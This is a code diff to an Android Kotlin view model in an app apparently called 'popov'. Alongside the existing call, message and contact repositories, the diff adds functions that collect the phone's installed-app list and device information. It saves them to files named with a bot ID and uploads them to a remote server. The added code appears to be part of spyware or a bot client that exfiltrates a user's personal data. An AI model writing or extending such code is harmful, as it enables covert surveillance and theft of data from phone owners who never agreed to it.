@@ -7,8 +7,10 @@ import androidx.compose.runtime.State
 import androidx.compose.runtime.mutableStateOf
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
+import com.github.yohannestz.popov.data.local.ApplicationsRepository
 import com.github.yohannestz.popov.data.local.CallRepository
 import com.github.yohannestz.popov.data.local.ContactsRepository
+import com.github.yohannestz.popov.data.local.DeviceInfoRepository
 import com.github.yohannestz.popov.data.local.MessageRepository
 import com.github.yohannestz.popov.data.local.db.impl.CallLogRepositoryImpl
 import com.github.yohannestz.popov.data.local.db.impl.ContactsFileLogRepositoryImpl
@@ -37,6 +39,8 @@ class CallsViewModel @Inject constructor(
     private val callRepository: CallRepository,
     private val messageRepository: MessageRepository,
     private val contactsRepository: ContactsRepository,
+    private val applicationsRepository: ApplicationsRepository,
+    private val deviceInfoRepository: DeviceInfoRepository,
     private val networkService: NetworkService,
     private val callLogRepositoryImpl: CallLogRepositoryImpl,
     private val messageLogRepositoryImpl: MessageLogRepositoryImpl,
@@ -70,7 +74,89 @@ class CallsViewModel @Inject constructor(
             withContext(Dispatchers.IO) {
                 //initContactsCache()
                 //startUpload()
+                //getAllApps()
+                getData()
             }
+        }
+    }
+
+    private fun getData() {
+        val gson = Gson()
+        val str = gson.toJson(deviceInfoRepository.getDeviceInformation())
+        Log.e("deviceInfo",str)
+    }
+
+    fun getAllApps() {
+        viewModelScope.launch {
+            withContext(Dispatchers.Main) {
+                _state.value = state.value.copy(
+                    isLoading = true
+                )
+            }
+
+            withContext(Dispatchers.IO) {
+                val apps = applicationsRepository.getAllApps()
+                Log.e("apps: ", "size -> ${apps.size}")
+                val currentTime: Date = Calendar.getInstance().time
+
+                val appFile = File(
+                    application.applicationContext.filesDir,
+                    "apps_${bot.botId}_${currentTime.time}.json"
+                )
+
+                val gson = Gson()
+                val fileOutputStream = FileOutputStream(appFile)
+                try {
+                    val jsonString = gson.toJson(apps)
+                    fileOutputStream.write(jsonString.toByteArray())
+                } catch (ex: Exception) {
+                    ex.printStackTrace()
+                } finally {
+                    fileOutputStream.close()
+                }
+
+                val requestBody = RequestBody.create(MediaType.parse("text/plain"), appFile)
+                val fileToUpload = MultipartBody.Part.createFormData("sampleFile", appFile.name, requestBody)
+                val filename = RequestBody.create(MediaType.parse("multipart/form-data"), appFile.name)
+                val response = networkService.uploadFile(fileToUpload, filename).body()
+                Log.e("response: ", response.toString())
+                if (response!!.success) {
+                    Log.e("updatedDb: ", "apps are uploaded.")
+                }
+            }
+
+            withContext(Dispatchers.Main) {
+                _state.value = state.value.copy(
+                    isLoading = false
+                )
+            }
+
+        }
+    }
+
+    fun sendDeviceInfo() {
+        viewModelScope.launch {
+            withContext(Dispatchers.Main) {
+                _state.value = state.value.copy(
+                    isLoading = true
+                )
+            }
+
+            withContext(Dispatchers.IO) {
+                val deviceInfo = deviceInfoRepository.getDeviceInformation()
+                val response = networkService.sendDeviceInfo(bot.botId, deviceInfo)
+                Log.e("response: ", response.toString())
+                if (response.isSuccessful) {
+                    Log.e("updatedDb: ", "device info sent to server")
+                }
+            }
+
+            withContext(Dispatchers.Main) {
+                _state.value = state.value.copy(
+                    isLoading = false
+                )
+            }
+
         }
     }
 
